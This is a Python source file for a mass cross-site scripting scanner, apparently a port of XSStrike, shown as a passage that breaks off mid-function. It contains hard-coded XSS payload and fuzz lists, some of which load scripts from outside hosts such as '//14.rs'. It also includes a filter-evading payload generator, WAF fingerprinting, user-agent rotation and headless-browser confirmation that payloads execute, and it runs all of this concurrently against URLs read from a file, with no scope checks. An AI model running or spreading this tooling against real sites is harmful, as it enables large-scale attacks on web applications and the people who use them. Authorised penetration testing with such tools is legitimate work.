#!/usr/bin/env python3
"""
XSStrike Mass Scanner
Port of XSStrike's core logic (scan mode) with added mass-scanning from a URL file.
Same detection engine, parallel URL processing.
"""

import copy
import json
import os
import random
import re
import sys
import threading
import time
import warnings
import uuid
import tempfile
import shutil
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, unquote, unquote_plus, parse_qsl

warnings.filterwarnings("ignore")

# ─── Colors ───────────────────────────────────────────────────────────────────

colors = sys.platform != "win32" or int(__import__("platform").version().split(".")[2]) >= 10586
if colors:
    end      = "\033[0m"
    red      = "\033[91m"
    green    = "\033[92m"
    yellow   = "\033[93m"
    white    = "\033[97m"
    back     = "\033[7;91m"
    info     = "\033[93m[!]\033[0m"
    que      = "\033[94m[?]\033[0m"
    bad      = "\033[91m[-]\033[0m"
    good     = "\033[92m[+]\033[0m"
    run      = "\033[97m[~]\033[0m"
else:
    end = red = green = yellow = white = back = info = que = bad = good = run = ""

# ─── Config ───────────────────────────────────────────────────────────────────

XSSCHECKER   = "0x3zo"
PROXIES      = {}
MIN_EFFICIENCY = 90
TIMEOUT      = 10
DEFAULT_DELAY = 0
MAX_WORKERS  = 5

SPECIAL_ATTRS = ["srcdoc", "src"]
BAD_TAGS      = ("iframe", "title", "textarea", "noembed", "style", "template", "noscript")
TAGS          = ("html", "d3v", "a", "details")
J_FILLINGS    = (";",)
L_FILLINGS    = ("", "%0dx")
E_FILLINGS    = ("%09", "%0a", "%0d", "+")
FILLINGS      = ("%09", "%0a", "%0d", "/+/")

EVENT_HANDLERS = {
    "ontoggle":       ["details"],
    "onpointerenter": ["d3v", "details", "html", "a"],
    "onmouseover":    ["a", "html", "d3v"],
}
FUNCTIONS = (
    "[8].find(confirm)", "confirm()",
    "(confirm)()", "co\\u006efir\\u006d()",
    "(prompt)``", "a=prompt,a()"
)

PAYLOADS = (
    '\'"</Script><Html Onmouseover=(confirm)()//',
    '<imG/sRc=l oNerrOr=(prompt)() x>',
    '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>',
    '<deTails open oNToggle=confi\\u0072m()>',
    '<img sRc=l oNerrOr=(confirm)() x>',
    '<svg/x=""/onload=confirm()//',
    '<svg%0Aonload=%09((pro\\u006dpt))()//',
    '<iMg sRc=x:confirm`` oNlOad=e\\u0076al(src)>',
    '<sCript x>confirm``</scRipt x>',
    '<Script x>prompt()</scRiPt x>',
    '<sCriPt sRc=//14.rs>',
    '<embed//sRc=//14.rs>',
    '<base href=//14.rs/><script src=/>',
    '<object//data=//14.rs>',
    '<s=" onclick=confirm``>clickme',
    '<svG oNLoad=co\\u006efirm&#x28;1&#x29;',
    '\'"><y///oNMousEDown=((confirm))()>Click',
    '<a/href=javascript&colon;co\\u006efirm&#40;&quot;1&quot;&#41;>clickme</a>',
    '<img src=x onerror=confir\\u006d`1`>',
    '<svg/onload=co\\u006efir\\u006d`1`>',
)

FUZZES = (
    "<test", "<test//", "<test>", "<test x>", "<test x=y>", "<test x=y//",
    "<test/oNxX=yYy//", "<test oNxX=yYy>", "<test onload=x>", "<test/o%00nload=x>",
    "<test sRc=xxx>", "<test data=asa>", "<test data=javascript:asa>", "<svg x=y>",
    "<details x=y//>", "<a href=x//>", "<emBed x=y>", "<object x=y//>",
    "<bGsOund sRc=x>", "<iSinDEx x=y//>", "<aUdio x=y>", "<script x=y>",
    "<script//src=//>", "\">payload<br/attr=\"", "\"-confirm``-\"",
    "<test ONdBlcLicK=x>", "<test/oNcoNTeXtMenU=x>", "<test OndRAgOvEr=x>",
)

HEADERS = {
    "User-Agent":        "$",
    "Accept":            "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language":   "en-US,en;q=0.5",
    "Accept-Encoding":   "gzip,deflate",
    "Connection":        "close",
    "DNT":               "1",
    "Upgrade-Insecure-Requests": "1",
}

BLIND_PARAMS = [
    "redirect", "redir", "url", "link", "goto", "debug", "_debug", "test", "get",
    "index", "src", "source", "file", "frame", "config", "new", "old", "var",
    "rurl", "return_to", "_return", "returl", "last", "text", "load", "email",
    "mail", "user", "username", "password", "pass", "passwd", "first_name",
    "last_name", "back", "href", "ref", "data", "input", "out", "net", "host",
    "address", "code", "auth", "userid", "auth_token", "token", "error",
    "keyword", "key", "q", "query", "aid", "bid", "cid", "did", "eid", "fid",
    "gid", "hid", "iid", "jid", "kid", "lid", "mid", "nid", "oid", "pid", "qid",
    "rid", "sid", "tid", "uid", "vid", "wid", "xid", "yid", "zid", "cal",
    "country", "x", "y", "topic", "title", "head", "higher", "lower", "width",
    "height", "add", "result", "log", "demo", "example", "message",
]

WAF_SIGNATUTES_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "db", "wafSignatures.json")
try:
    with open(WAF_SIGNATUTES_PATH, "r") as _f:
        WAF_SIGNATURES = json.load(_f)
except (FileNotFoundError, json.JSONDecodeError):
    WAF_SIGNATURES = {}

# ─── Logging helpers ──────────────────────────────────────────────────────────

_lock = threading.Lock()
_scan_output = []  # buffer for scan messages during scan
_bar = sys.stdout

def _pr(color, msg):
    if not _quiet_scan:
        with _lock:
            sys.stdout.write(f"{color}{msg}{end}\n")
            sys.stdout.flush()

# ─── Quiet scan mode ─────────────────────────────────────────────────────────
_quiet_scan = True  # suppress scan messages while scanning
_scan_vuln_urls = []  # collect vulnerable URLs for final display

def info_msg(msg):   _pr(info,    msg)
def bad_msg(msg):    _pr(bad,    msg)
def good_msg(msg):   _pr(good,   msg)
def run_msg(msg, **kwargs):    _pr(run,    msg)
def red_line():      sys.stdout.write(f"{red}{'-'*60}{end}\n"); sys.stdout.flush()
def vuln_msg(msg):   _pr(f"{green}[++] {end}", msg)

# ─── Requester ────────────────────────────────────────────────────────────────

UA_LIST = [
    "Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
]

def requester(url, data=None, headers=None, GET=True, delay=0, timeout=10):
    import requests
    from urllib3.util.retry import Retry
    from requests.adapters import HTTPAdapter

    hdrs = dict(headers) if headers else dict(HEADERS)
    if hdrs.get("User-Agent") == "$":
        hdrs["User-Agent"] = random.choice(UA_LIST)
    hdrs.setdefault("Accept-Language", "en-US,en;q=0.5")

    session = requests.Session()
    retries = Retry(total=2, backoff_factor=0.3, status_forcelist=[429, 500, 502, 503, 504])
    session.mount("http://", HTTPAdapter(max_retries=retries))
    session.mount("https://", HTTPAdapter(max_retries=retries))

    time.sleep(delay)
    try:
        if GET:
            resp = session.get(url, params=data, headers=hdrs, timeout=timeout,
                                verify=False, proxies=PROXIES, allow_redirects=True)
        else:
            resp = session.post(url, data=data, headers=hdrs, timeout=timeout,
                                verify=False, proxies=PROXIES, allow_redirects=True)
        return resp
    except requests.exceptions.Timeout:
        bad_msg(f"  Timeout for {url[:70]}")
        import requests
        r = requests.Response()
        return r
    except requests.exceptions.ConnectionError as e:
        bad_msg(f"  Connection error: {e}")
        import requests
        r = requests.Response()
        return r
    except Exception as e:
        bad_msg(f"  Error: {e}")
        import requests
        r = requests.Response()
        return r

# ─── WAF Detector ─────────────────────────────────────────────────────────────

def waf_detector(url, headers, delay, timeout):
    test_url = url.split("?")[0] + "?" + XSSCHECKER + "=" + "<script>alert('XSS')</script>"
    resp = requester(test_url, {}, headers, GET=True, delay=delay, timeout=timeout)
    code = str(resp.status_code)
    page = resp.text
    resp_hdrs = str(resp.headers)

    if resp.status_code is None:
        raise ConnectionError("WAF probe failed")
    if int(code) >= 400 and WAF_SIGNATURES:
        best_match = [0, None]
        for waf_name, sig in WAF_SIGNATURES.items():
            score = 0
            if sig.get("page") and re.search(sig["page"], page, re.I):
                score += 1
            if sig.get("code") and re.search(sig["code"], code, re.I):
                score += 0.5
            if sig.get("headers") and re.search(sig["headers"], resp_hdrs, re.I):
                score += 1
            if score > best_match[0]:
                best_match = [score, waf_name]
        return best_match[1]
    return None

# ─── Utilities ────────────────────────────────────────────────────────────────

def extract_headers(raw):
    headers = raw.replace("\\n", "\n")
    parsed = {}
    for match in re.findall(r"(.*?):\s(.*)", headers):
        h, v = match[0], match[1]
        try:
            if v[-1] == ",":
                v = v[:-1]
        except IndexError:
            pass
        parsed[h] = v
    return parsed

def replace_value(mapping, old, new):
    m = copy.deepcopy(mapping) if isinstance(mapping, dict) else dict(mapping)
    if old in m.values():
        for k in list(m.keys()):
            if m[k] == old:
                m[k] = new
    return m

def get_params(url, data, GET):
    if GET:
        return dict(parse_qsl(urlparse(url).query, keep_blank_values=True))
    if isinstance(data, dict):
        return dict(data)
    if data:
        try:
            parsed = json.loads(data)
            if isinstance(parsed, dict):
                return parsed
        except (ValueError, TypeError):
            pass
        return dict(parse_qsl(data, keep_blank_values=True))
    return {}

def random_upper(s):
    return "".join(random.choice((a, b)) for a, b in zip(s.upper(), s.lower()))

def stripper(string, substring, direction="right"):
    done = False
    result = ""
    if direction == "right":
        string = string[::-1]
    for ch in string:
        if ch == substring and not done:
            done = True
        else:
            result += ch
    if direction == "right":
        result = result[::-1]
    return result

def escaped(position, string):
    usable = string[:position][::-1]
    match = re.search(r"^\\*", usable)
    if match:
        count = len(match.group())
        return count % 2 == 1
    return False

# ─── Checker (reflection efficiency) ──────────────────────────────────────────


def _efficiency(reflected, check_string):
    return 100 if check_string and check_string == reflected else 0

def checker(url, params, headers, GET, delay, payload, positions, timeout):
    check_string = "st4r7s" + payload + "3nd"
    resp = requester(url, replace_value(params, XSSCHECKER, check_string),
                     headers, GET, delay, timeout)
    if resp.status_code is None:
        raise ConnectionError("Reflection probe failed")
    matches = re.findall(r"st4r7s(.*?)3nd", resp.text, re.S)
    return [100 if i < len(matches) and matches[i] == payload else 0
            for i in range(len(positions))]

def confirm_response(response, callback, timeout):
    """Require execution of a unique probe; preserve CSP/MIME and block network."""
    from playwright.sync_api import sync_playwright
    if response.status_code is None:
        raise ConnectionError("Confirmation request failed")
    mime = response.headers.get("Content-Type", "").split(";", 1)[0].lower()
    if mime not in ("text/html", "application/xhtml+xml"):
        return False
    confirmed = []
    with sync_playwright() as p:
        browser = p.chromium.launch(channel="msedge", headless=True)
        try:
            context = browser.new_context(service_workers="block", accept_downloads=False)
            context.expose_binding(callback, lambda source, *args: confirmed.append(True))
            page = context.new_page()
            served = False
            def route_request(route):
                nonlocal served
                if not served and route.request.is_navigation_request() and route.request.frame == page.main_frame:
                    served = True
                    headers = {k: v for k, v in response.headers.items()
                               if k.lower() not in ("content-length", "content-encoding", "transfer-encoding", "connection", "set-cookie", "location")}
                    route.fulfill(status=response.status_code, headers=headers, body=response.content)
                else:
                    route.abort()
            context.route("**/*", route_request)
            page.on("dialog", lambda dialog: dialog.dismiss())
            page.goto(response.url, wait_until="domcontentloaded", timeout=max(1000, int(timeout * 1000)))
            page.wait_for_timeout(250)
            for element in page.locator("*").all():
                if confirmed:
                    break
                attrs = element.evaluate("e => Array.from(e.attributes, a => a.value)")
                if not any(callback in value for value in attrs):
                    continue
                for action in (element.hover, element.focus, element.click):
                    try:
                        action(timeout=300)
                        page.wait_for_timeout(50)
                    except Exception:
                        continue
                    if confirmed:
                        break
            return bool(confirmed)
        finally:
            browser.close()

def confirm_payload(url, params, headers, GET, delay, payload, timeout):
    callback = "xssnuts_" + uuid.uuid4().hex
    decoded = re.sub(r"\\u([0-9a-fA-F]{4})", lambda m: chr(int(m.group(1), 16)), payload)
    probe, count = re.subn(r"\b(?:alert|confirm|prompt)\b", callback, decoded)
    if not count:
        return None
    resp = requester(url, replace_value(params, XSSCHECKER, probe), headers, GET, delay, timeout)
    if confirm_response(resp, callback, timeout):
        return {"payload": probe, "request_url": resp.url,
                "verification": "browser-execution", "callback": callback}
    return None

# ─── HTML Parser ─────────────────────────────────────────────────────────────

def extract_scripts(response):
    scripts = []
    for m in re.findall(r"(?s)<script.*?>(.*?)</script>", response.lower()):
        if XSSCHECKER in m:
            scripts.append(m)
    return scripts

def js_contexter(script):
    parts = script.split(XSSCHECKER)
    pre = parts[0]
    pre = re.sub(r"(?s)\{.*?\}|\(.*?\)|\".*?\"|'.*?'", "", pre)
    breaker = ""
    for i, ch in enumerate(pre):
        if ch == "{":
            breaker += "}"
        elif ch == "(":
            breaker += ");"
        elif ch == "[":
            breaker += "]"
        elif ch == "/":
            try:
                if pre[i + 1] == "*":
                    breaker += "/*"
            except IndexError:
                pass
        elif ch == "}":
            breaker = stripper(breaker, "}")
        elif ch == ")":
            breaker = stripper(breaker, ")")
        elif breaker == "]":
            breaker = stripper(breaker, "]")
    return breaker[::-1]

def html_parser(response, encoding=None):
    raw = response if isinstance(response, str) else response.text
    resp = raw
    if encoding:
        resp = resp.replace(encoding(XSSCHECKER), XSSCHECKER)

    reflections = resp.count(XSSCHECKER)
    if reflections == 0:
        return {}, {}

    pos_ctx = {}
    env_detail = {}
    clean = re.sub(r"<!--[.\s\S]*?-->", "", resp)
    script_checkable = clean

    # --- script context ---
    for script in extract_scripts(script_checkable):
        for occ in re.finditer(r"(%s.*?$)" % re.escape(XSSCHECKER), script):
            pos = occ.start(1)
            pos_ctx[pos] = "script"
            env_detail[pos] = {"details": {"quote": ""}}
            grp = occ.group()
            for j, ch in enumerate(grp):
                if ch in ("/", "'", "`", '"') and not escaped(j, grp):
                    env_detail[pos]["details"]["quote"] = ch
                elif ch in (")", "]", "}", "}") and not escaped(j, grp):
                    break
            script_checkable = script_checkable.replace(XSSCHECKER, "", 1)

    # --- attribute context ---
    if len(pos_ctx) < reflections:
        for occ in re.finditer(r"<[^>]*?(%s)[^>]*?>" % re.escape(XSSCHECKER), clean):
            match_str = occ.group(0)
            pos = occ.start(1)
            parts = re.split(r"\s", match_str)
            tag = parts[0][1:]
            Type = quote = name = value = ""
            for part in parts:
                if XSSCHECKER in part:
                    if "=" in part:
                        qm = re.search(r"=([\"`'])?", part)
                        quote = (qm.group(1) or "") if qm else ""
                        nv = part.split("=")
                        name = nv[0]
                        value = "=".join(nv[1:]).rstrip(">").rstrip(quote).lstrip(quote)
                        Type = "name" if XSSCHECKER == name else "value"
                    else:
                        Type = "flag"
                    pos_ctx[pos] = "attribute"
                    env_detail[pos] = {"details": {"tag": tag, "type": Type,
                                                      "quote": quote, "value": value, "name": name}}
            break  # only first attr match per tag instance for simplicity

    # --- HTML context ---
    if len(pos_ctx) < reflections:
        for occ in re.finditer(re.escape(XSSCHECKER), clean):
            pos = occ.start()
            if pos not in pos_ctx:
                pos_ctx[pos] = "html"
                env_detail[pos] = {"details": {}}

    # --- comment context ---
    if len(pos_ctx) < reflections:
        for occ in re.finditer(r"<!--[\s\S]*?(%s)[\s\S]*?-->" % re.escape(XSSCHECKER), resp):
            pos = occ.start(1)
            pos_ctx[pos] = "comment"
            env_detail[pos] = {"details": {}}

    # Build ordered database
    database = {}
    for i in sorted(pos_ctx):
        database[i] = {
            "position": i,
            "context": pos_ctx[i],
            "details": env_detail[i]["details"],
        }

    # Mark non-executable contexts
    bad_tag_pattern = (r"(?si)<(style|template|textarea|title|noembed|noscript)>"
                       r"[.\s\S]*?(%s)[.\s\S]*?</\1>" % re.escape(XSSCHECKER))
    non_exec = []
    for occ in re.finditer(bad_tag_pattern, resp):
        non_exec.append([occ.start(), occ.end(), occ.group(1)])

    for key in database:
        pos = database[key]["position"]
        bad = ""
        for nb in non_exec:
            if nb[0] < pos < nb[1]:
                bad = nb[2]
                break
        database[key]["details"]["badTag"] = bad

    return database, resp

# ─── Filter Checker ───────────────────────────────────────────────────────────

def filter_checker(url, params, headers, GET, delay, occurences, timeout, encoding):
    positions = list(occurences.keys())
    environments = {"<", ">"}
    for i in occurences:
        ctx = occurences[i]["context"]
        if ctx == "comment":
            environments.add("-->")
        elif ctx == "script":
            environments.add(occurences[i]["details"].get("quote", ""))
            environments.add("</scRipT/>")
        elif ctx == "attribute":
            d = occurences[i]["details"]
            if d.get("type") == "value" and d.get("name") == "srcdoc":
                environments.add("&lt;")
                environments.add("&gt;")
            if d.get("quote"):
                environments.add(d["quote"])

    efficiencies_map = {i: {} for i in positions}
    for env in environments:
        if not env:
            continue
        effs = checker(url, params, headers, GET, delay, env, positions, timeout)
        while len(effs) < len(positions):
            effs.append(0)
        for idx, occ_key in enumerate(positions):
            efficiencies_map[occ_key][env] = effs[idx]

    for k in efficiencies_map:
        occurences[k]["score"] = efficiencies_map[k]
    return occurences

# ─── Generator ────────────────────────────────────────────────────────────────

def gen_gen(fillings, e_fillings, l_fillings, event_handlers, tags, functions, ends, bad_tag=""):
    vectors = defaultdict(set)
    ru = random_upper
    for tag in tags:
        bait = XSSCHECKER if tag in ("d3v", "a") else ""
        for eh in event_handlers:
            if tag not in event_handlers[eh]:
                continue
            for fn in functions:
                for f in fillings:
                    for ef in e_fillings:
                        for lf in l_fillings:
                            for end_tok in ends:
                                if tag in ("d3v", "a") and ">" in end_tok:
                                    end_tok = ">"
                                breaker = ""
                                if bad_tag:
                                    breaker = "</" + ru(bad_tag) + ">"
                                vector = (breaker + "<" + ru(tag) + f + ru(eh)
                                          + ef + "=" + ef + fn + lf + end_tok + bait)
                                vectors[10].add(vector)
    return vectors

def generator(occurences, response_text):
    ru = random_upper
    scripts = extract_scripts(response_text)
    index = 0
    vectors = {11: set(), 10: set(), 9: set(), 8: set(), 7: set(),
               6: set(), 5: set(), 4: set(), 3: set(), 2: set(), 1: set()}

    for i in sorted(occurences.keys()):
        ctx = occurences[i]["context"]
        det = occurences[i].get("details", {})
        # Fix: read scores from occurences[i]["score"] if available (from filter_checker)
        score = occurences[i].get("score", {})
        if score:
            det = dict(det)
            det["score"] = score

        if ctx == "html":
            less_eff  = det.get("score", {}).get("<", 0)
            great_eff = det.get("score", {}).get(">", 0)
            ends = ["//"]
            bad_tag = det.get("badTag", "")
            if great_eff == 100:
                ends.append(">")
            if less_eff:
                for p in (item for group in gen_gen(FILLINGS, E_FILLINGS, L_FILLINGS,
                                  EVENT_HANDLERS, TAGS, FUNCTIONS, ends, bad_tag).values() for item in group):
                    vectors[10].add(p)

        elif ctx == "attribute":
            tag      = det.get("tag", "")
            Type     = det.get("type", "")
            quote    = det.get("quote", "")
            attr_name= det.get("name", "")
            attr_val = det.get("value", "")
            quotes_eff  = det.get("score", {}).get(quote, 100) if quote else 100
            great_eff   = det.get("score", {}).get(">", 0)
            ends = ["//"]
            if great_eff == 100:
                ends.append(">")

            if great_eff == 100 and quotes_eff == 100:
                for p in (item for group in gen_gen(FILLINGS, E_FILLINGS, L_FILLINGS,
                                  EVENT_HANDLERS, TAGS, FUNCTIONS, ends).values() for item in group):
                    vectors[9].add(quote + ">" + p)

            if quotes_eff == 100:
                for f in FILLINGS:
                    for fn in FUNCTIONS:
                        vec = quote + f + ru("autofocus") + f + ru("onfocus") + "=" + quote + fn
                        vectors[8].add(vec)

            if quotes_eff == 90:
                for f in FILLINGS:
                    for fn in FUNCTIONS:
                        vec = "\\" + quote + f + ru("autofocus") + f + ru("onfocus") + "=" + fn + f + "\\" + quote
                        vectors[7].add(vec)

            if Type == "value":
                if attr_name == "srcdoc":
                    if det.get("score", {}).get("&lt;") and det.get("score", {}).get("&gt;"):
                        es = ["%26gt;"]
                        for p in (item for group in gen_gen(FILLINGS, E_FILLINGS, L_FILLINGS,
                                          EVENT_HANDLERS, TAGS, FUNCTIONS, es).values() for item in group):
                            vectors[9].add(p.replace("<", "%26lt;"))
                elif attr_name == "href" and attr_val == XSSCHECKER:
                    for fn in FUNCTIONS:
                        vectors[10].add(ru("javascript:") + fn)
                elif attr_name.startswith("on"):
                    closer = js_contexter(attr_val)
                    q = ""
                    for ch in attr_val.split(XSSCHECKER)[1]:
                        if ch in ("'", '"', "`"):
                            q = ch
                            break
                    sfx = "//\\"
                    for f in J_FILLINGS:
                        for fn in FUNCTIONS:
                            vec = q + closer + f + fn + sfx
                            vectors[7].add(vec) if vectors[7] else vectors[9].add(vec)
                    if quotes_eff > 83:
                        sfx = "//"
                        for f in J_FILLINGS:
                            for fn in FUNCTIONS:
                                if "=" in fn:
                                    fn2 = "(" + fn + ")"
                                else:
                                    fn2 = fn
                                filling = "" if q == "" else f
                                vec = "\\" + q + closer + filling + fn2 + sfx
                                vectors[7].add(vec) if vectors[7] else vectors[9].add(vec)
                elif tag in ("script", "iframe", "embed", "object"):
                    if attr_name in ("src", "iframe", "embed") and attr_val == XSSCHECKER:
                        vectors[10].add("//15.rs")
                        vectors[10].add("\\/\\\\\\/\\15.rs")
                    elif tag == "object" and attr_name == "data" and attr_val == XSSCHECKER:
                        for fn in FUNCTIONS:
                            vectors[10].add(ru("javascript:") + fn)
                    elif quotes_eff == great_eff == 100:
                        for p in (item for group in gen_gen(FILLINGS, E_FILLINGS, L_FILLINGS,
                                          EVENT_HANDLERS, TAGS, FUNCTIONS, ends).values() for item in group):
                            vectors[11].add(quote + ">" + ru("</script/>") + p)

        elif ctx == "comment":
            less_eff  = det.get("score", {}).get("<", 0)
            great_eff = det.get("score", {}).get(">", 0)
            ends = ["//"]
            if great_eff == 100:
                ends.append(">")
            if less_eff == 100:
                for p in (item for group in gen_gen(FILLINGS, E_FILLINGS, L_FILLINGS,
                                  EVENT_HANDLERS, TAGS, FUNCTIONS, ends).values() for item in group):
                    vectors[10].add(p)

        elif ctx == "script":
            if scripts:
                try:
                    script = scripts[index]
                except IndexError:
                    script = scripts[0]
            else:
                continue
            closer  = js_contexter(script)
            quote   = det.get("quote", "")
            script_eff = det.get("score", {}).get("</scRipT/>", 0)
            great_eff   = det.get("score", {}).get(">", 0)
            breaker_eff = 100 if not quote else det.get("score", {}).get(quote, 100)
            ends = ["//"]
            if great_eff == 100:
                ends.append(">")
            if script_eff == 100:
                breaker = ru("</script/>")
                for p in (item for group in gen_gen(FILLINGS, E_FILLINGS, L_FILLINGS,
                                  EVENT_HANDLERS, TAGS, FUNCTIONS, ends).values() for item in group):
                    vectors[10].add(p)
            if closer:
                sfx = "//\\"
                for f in J_FILLINGS:
                    for fn in FUNCTIONS:
                        vec = quote + closer + f + fn + sfx
                        vectors[7].add(vec)
            elif breaker_eff > 83:
                prefix = "" if breaker_eff == 100 else "\\"
                sfx = "//"
                for f in J_FILLINGS:
                    for fn in FUNCTIONS:
                        if "=" in fn:
                            fn = "(" + fn + ")"
                        filling = "" if quote == "" else f
                        vec = prefix + quote + closer + filling + fn + sfx
                        vectors[6].add(vec)
            index += 1

    return dict(vectors)

SCAN_PAYLOADS = ("<script>alert('1')</script>", '<img src=x onerror=alert(1)>', '<svg onload=alert(1)>', '"><img src=x onerror=alert(1)>', "'><img src=x onerror=alert(1)>", '</textarea><script>alert(1)</script>', '</title><script>alert(1)</script>', '</script><script>alert(1)</script>', "';alert(1);//", '";alert(1);//')

def select_scan_payloads(limit=5):
    """Keep the three basic probes, then vary the context breakout probes."""
    if limit < 0:
        raise ValueError("max_payloads must be non-negative")
    count = len(SCAN_PAYLOADS) if limit == 0 else min(limit, len(SCAN_PAYLOADS))
    basic = list(SCAN_PAYLOADS[:min(3, count)])
    return basic + random.sample(list(SCAN_PAYLOADS[3:]), count - len(basic))

# ─── Single URL Scan ──────────────────────────────────────────────────────────

def scan_single(target, headers, delay, timeout, skip_dom=False, skip_prompt=False,
                encoding=None, param_data=None, max_payloads=5):
    GET = param_data is None
    result = {"url": target, "vulnerable": False, "findings": [], "waf": None,
              "params_tested": [], "reflections": 0, "payloads_generated": 0}
    url = target.split("?")[0] if GET else target
    params = get_params(target, param_data, GET)

    if not params:
        params = {"q": ""}

    # WAF detection
    first_param = list(params.keys())[0]
    waf = waf_detector(url, headers, delay, timeout)
    result["waf"] = waf
    if waf:
        result["findings"].append(f"WAF detected: {waf}")

    # DOM check
    if not skip_dom:
        dom_resp = requester(target, {}, headers, True, delay, timeout)
        if dom_resp.status_code is None:
            raise ConnectionError("DOM probe failed")
        dom_findings = dom_check(dom_resp.text)
        if dom_findings:
            result["findings"].extend(dom_findings)
            result["potential_findings"] = dom_findings
            result["findings"] = []

    # Select five distinct payloads once per URL and reuse them for its parameters.
    selected_payloads = select_scan_payloads(max_payloads)
    result["payloads_selected"] = selected_payloads
    result["payloads_tested"] = 0

    # Probe each parameter
    for param_name in list(params.keys()):
        params_copy = copy.deepcopy(params)
        params_copy[param_name] = XSSCHECKER

        resp = requester(url, params_copy, headers, GET, delay, timeout)

        if resp.status_code is None:
            raise ConnectionError("Parameter probe failed")
        result["params_tested"].append(param_name)
        occurences, raw_resp = html_parser(resp, encoding)
        result["reflections"] = max(result["reflections"], len(occurences))

        if not occurences:
            continue

        result["payloads_generated"] = len(selected_payloads)
        for payload in selected_payloads:
            result["payloads_tested"] += 1
            effs = checker(url, params_copy, headers, GET, delay,
                           payload, list(occurences.keys()), timeout)
            if effs and max(effs) == 100:
                evidence = confirm_payload(url, params_copy, headers, GET, delay, payload, timeout)
                if evidence:
                    result["vulnerable"] = True
                    evidence["parameter"] = param_name
                    result["findings"].append(evidence)

    run_msg("")  # clear progress line
    return result

# ─── Simple DOM check (inline, no dependency on original dom.py) ──────────────

def dom_check(response):
    findings = []
    sources = r'''(?:document\.(URL|documentURI|URLUnencoded|baseURI|cookie|referrer)|location\.(href|search|hash|pathname|assign)|window\.name|history\.(pushState|replaceState)(local|session)Storage)'''
    sinks   = r'''(?:eval|evaluate|execCommand|assign|navigate|open\s*\(|showModalDialog|Function\s*\(|set(Timeout|Interval|Immediate)\s*\(|execScript|crypto\.generateCRMFRequest|ScriptElement\.(src|text|textContent|innerText)|.*?\.onEventName|document\.(write|writeln)|.*?\.innerHTML|Range\.createContextualFragment|(document|window)\.location)'''
    # HTML-level sinks (no script tag needed)
    html_sinks = [
        r'<iframe\s+src\s*=\s*(["\x27])?javascript:',
        r'<form\s+action\s*=\s*(["\x27])?javascript:',
        r'<a\s+href\s*=\s*(["\x27])?javascript:',
        r'expression\s*\(',
    ]
    for pattern in html_sinks:
        for m in re.finditer(pattern, response, re.I):
            findings.append(f"HTML sink: {m.group(0).strip()[:100]}")

    # Script-level DOM analysis
    for m in re.finditer(r"(?i)(?s)<script[^>]*>(.*?)</script>", response):
        script = m.group(1)
        for line_no, line in enumerate(script.split("\n"), 1):
            if re.search(sources, line) and re.search(sinks, line):
                findings.append(f"DOM XSS (line {line_no}): {line.strip()[:80]}")
    return findings

# ─── Mass Scanner ─────────────────────────────────────────────────────────────

def load_urls(path):
    urls = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if line and line.startswith(("http://", "https://")):
                urls.append(line)
    return urls

def public_result(result):
    """Only confirmed findings belong in the user-facing JSON."""
    findings = [f for f in result.get("findings", [])
                if isinstance(f, dict) and f.get("verification") == "browser-execution"]
    if not result.get("vulnerable") or not findings:
        return None
    return {"url": result["url"], "vulnerable": True, "findings": findings}


def write_results_atomic(output_file, results):
    fd, temp_path = tempfile.mkstemp(prefix=".xssnuts-", suffix=".json",
                                     dir=os.path.dirname(os.path.abspath(output_file)))
    preserve = False
    complete_snapshot = False
    try:
        with os.fdopen(fd, "w", encoding="utf-8") as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
            f.flush()
            os.fsync(f.fileno())
        complete_snapshot = True
        # Windows editors/antivirus may briefly lock the destination.
        for attempt in range(6):
            try:
                os.replace(temp_path, output_file)
                return
            except PermissionError:
                if attempt == 5:
                    raise
                time.sleep(0.1 * (attempt + 1))
    except OSError as exc:
        # Keep the complete new snapshot if replacement fails persistently.
        if complete_snapshot and os.path.exists(temp_path):
            preserve = True
            raise OSError(f"Cannot save {output_file}: {exc}. Recovery file: {temp_path}") from exc
        raise
    finally:
        if not preserve and os.path.exists(temp_path):
            os.unlink(temp_path)


def mass_scan(url_file, headers, concurrency=5, delay=0, timeout=10,
              skip_dom=False, skip_prompt=True, encoding=None,
              param_data=None, output_file="results.json", max_payloads=5):
    urls = load_urls(url_file)
    if not urls:
        bad_msg("No valid URLs found in file.")
        return []

    info_msg(f"Loaded {len(urls)} URLs from {url_file}")
    info_msg(f"Concurrency: {concurrency}  Timeout: {timeout}s\n")

    # host-level rate limiter
    host_lock = threading.Lock()
    host_last = defaultdict(float)

    def scan_with_delay(target):
        with host_lock:
            parsed = urlparse(target)
            host = parsed.netloc
            now = time.time()
            if host in host_last:
                elapsed = now - host_last[host]
                if elapsed < delay:
                    time.sleep(delay - elapsed)
            host_last[host] = time.time()
        return scan_single(target, headers, delay, timeout,
                           skip_dom=skip_dom, skip_prompt=skip_prompt,
                           encoding=encoding, param_data=param_data,
                           max_payloads=max_payloads)

    results = []
    vuln_results = []
    vuln_count = error_count = completed = 0
    output_file = os.path.abspath(output_file or "results.json")

    def save_results():
        write_results_atomic(output_file, vuln_results)

    previous_width = 0
    started = time.monotonic()
    display_lock = threading.Lock()
    stop_display = threading.Event()

    def print_status(final=False):
        nonlocal previous_width
        with display_lock:
            ok = completed - vuln_count - error_count
            elapsed = time.monotonic() - started
            pct = completed * 100 / len(urls)
            spinner = ("DONE" if completed == len(urls) else "STOPPED") if final else "|/-\\"[int(elapsed * 5) % 4]
            filled = int(pct / 10)
            progress_bar = "#" * filled + "-" * (10 - filled)
            status = (f"{spinner} VULN [{vuln_count}]  NOT VULN [{ok}]  ERROR [{error_count}]"
                      f" | {completed}/{len(urls)} [{progress_bar}] {pct:5.1f}% | {elapsed:0.0f}s")
            if not _bar.isatty():
                if final:
                    _bar.write(status + "\n")
                    _bar.flush()
                return
            width = max(1, shutil.get_terminal_size((100, 24)).columns - 1)
            plain = status[:width]
            rendered = plain
            if colors:
